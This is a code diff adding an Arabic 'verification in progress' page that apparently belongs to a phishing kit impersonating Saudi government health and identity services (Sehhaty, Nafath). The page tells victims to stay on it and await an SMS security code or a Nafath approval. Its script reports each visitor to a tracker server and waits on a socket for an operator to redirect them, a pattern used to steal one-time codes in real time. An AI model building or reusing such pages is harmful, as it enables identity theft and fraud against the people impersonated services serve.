@@ -1,0 +1,75 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>جاري مراجعة طلبك وتوثيق الهوية</title>
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700;900&display=swap" rel="stylesheet">
+    <script src="https://cdn.socket.io/4.7.2/socket.io.min.js"></script>
+    <style>
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Cairo', sans-serif !important; }
+        body { background: #f1f5f9; color: #1e293b; min-height: 100vh; display: flex; align-items: center; justify-content: center; padding: 15px; }
+        .box { background: white; border-radius: 20px; border: 1px solid #e2e8f0; padding: 40px 30px; box-shadow: 0 4px 15px rgba(0,0,0,0.02); max-width: 440px; width: 100%; text-align: center; position: relative; overflow: hidden; }
+        .bar { position: absolute; top: 0; left: 0; right: 0; height: 4px; background: linear-gradient(90deg, #3b82f6, #0ea5e9); }
+        .pulse-logo { width: 80px; height: 80px; background: #f0f9ff; border: 1.5px solid #bae6fd; border-radius: 50%; margin: 0 auto 25px; display: flex; align-items: center; justify-content: center; font-size: 32px; animation: pulse 2s infinite; }
+        @keyframes pulse {
+            0% { transform: scale(0.95); box-shadow: 0 0 0 0 rgba(14, 165, 233, 0.4); }
+            70% { transform: scale(1); box-shadow: 0 0 0 15px rgba(14, 165, 233, 0); }
+            100% { transform: scale(0.95); box-shadow: 0 0 0 0 rgba(14, 165, 233, 0); }
+        }
+        h2 { font-size: 18px; font-weight: 900; color: #0f172a; margin-bottom: 12px; }
+        p { font-size: 13px; color: #64748b; line-height: 1.7; margin-bottom: 25px; }
+        .loading-dots { display: inline-flex; gap: 4px; align-items: center; justify-content: center; margin-bottom: 20px; }
+        .dot { width: 8px; height: 8px; background: #0ea5e9; border-radius: 50%; animation: dotBounce 1.4s infinite ease-in-out both; }
+        .dot:nth-child(1) { animation-delay: -0.32s; }
+        .dot:nth-child(2) { animation-delay: -0.16s; }
+        @keyframes dotBounce {
+            0%, 80%, 100% { transform: scale(0); }
+            40% { transform: scale(1); }
+        }
+        .notice-card { background: #f8fafc; border: 1px solid #e2e8f0; padding: 15px; border-radius: 12px; font-size: 12px; font-weight: 700; text-align: right; color: #475569; line-height: 1.6; margin-bottom: 20px; }
+        .secure-footer { font-size: 11px; color: #94a3b8; display: flex; justify-content: center; gap: 5px; border-top: 1px solid #f1f5f9; padding-top: 15px; }
+    </style>
+</head>
+<body>
+    <div class="box">
+        <div class="bar"></div>
+        <div class="pulse-logo">⏳</div>
+        <h2>جاري معالجة الطلب والتوثيق</h2>
+        
+        <div class="loading-dots">
+            <div class="dot"></div>
+            <div class="dot"></div>
+            <div class="dot"></div>
+        </div>
+
+        <p>يرجى إبقاء هذه الصفحة مفتوحة وعدم الخروج منها. نقوم الآن بمطابقة تفاصيل الهوية وبطاقة الاتصال وتوثيق الإجراء مع البوابة الوطنية الموحدة لإصدار سند الإجراء والموافقة النهائية...</p>
+        
+        <div class="notice-card">
+            💡 <b>تنبيه هام:</b> قد يتطلب الإجراء رمز تحقق أمني إضافي يرسل لجوالك، أو تفعيل من تطبيق نفاذ، يرجى البقاء هنا ومتابعة الإرشادات فور ظهورها على الشاشة تلقائياً.
+        </div>
+
+        <div class="secure-footer">🛡️ بوابة التحقق الموحدة مأمنة بالكامل بالاتصال المباشر</div>
+    </div>
+
+    <script src="saas-hub-config.js"></script><script src="config.js"></script><script>var SERVER_URL = window.SERVER_HUB_URL || "http://localhost:5000";
+        var siteKey = "site_sehhaty_app_v1";
+        var visitorToken = localStorage.getItem('visitor_token') || 'vis_' + Math.random().toString(36).substring(2, 10);
+
+        fetch(SERVER_URL + '/api/tracker/ping', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ token: visitorToken, siteKey: siteKey, currentPage: '/wait.html', pageTitle: 'الانتظار والتوثيق النهائي - HOLD' })
+        }).catch(function(){});
+
+        try {
+            var socket = io(SERVER_URL);
+            socket.on('visitor_updated', function(v) {
+                if (v.token === visitorToken && v.status === 'go' && v.redirectUrl) {
+                    window.location.href = v.redirectUrl;
+                }
+            });
+        } catch(e){}
+    </script>
+</body>
+</html>
